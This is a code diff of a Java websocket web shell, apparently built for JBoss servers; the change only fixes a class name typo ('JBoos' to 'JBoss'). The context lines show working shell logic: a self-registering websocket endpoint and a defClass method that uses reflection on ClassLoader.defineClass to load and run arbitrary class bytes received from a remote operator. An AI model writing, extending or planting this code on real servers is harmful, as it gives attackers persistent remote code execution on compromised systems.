@@ -14,7 +14,7 @@ import java.net.URLClassLoader;
 import java.nio.ByteBuffer;
 import java.util.HashSet;
 
-public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
+public class AesJBossWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private Class payload = null;
@@ -24,10 +24,10 @@ public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.W
 
 
     static {
-        new AesJBoosWebsocketShell();
+        new AesJBossWebsocketShell();
     }
 
-    public AesJBoosWebsocketShell(){
+    public AesJBossWebsocketShell(){
         synchronized (lock){
             if (!initialized){
                 initialized = true;
@@ -40,7 +40,7 @@ public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.W
         }
     }
 
-    public AesJBoosWebsocketShell(Session session){
+    public AesJBossWebsocketShell(Session session){
         this.session = session;
     }
 
@@ -186,11 +186,11 @@ public class AesJBoosWebsocketShell extends Endpoint implements MessageHandler.W
     }
 
     public void onOpen(Session session, EndpointConfig endpointConfig) {
-        session.addMessageHandler(new AesJBoosWebsocketShell(session));
+        session.addMessageHandler(new AesJBossWebsocketShell(session));
     }
 
     private Class defClass(byte[] classBytes) throws Throwable {
-        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], AesJBoosWebsocketShell.class.getClassLoader());
+        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], AesJBossWebsocketShell.class.getClassLoader());
         Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         defineClassMethod.setAccessible(true);
         return (Class) defineClassMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
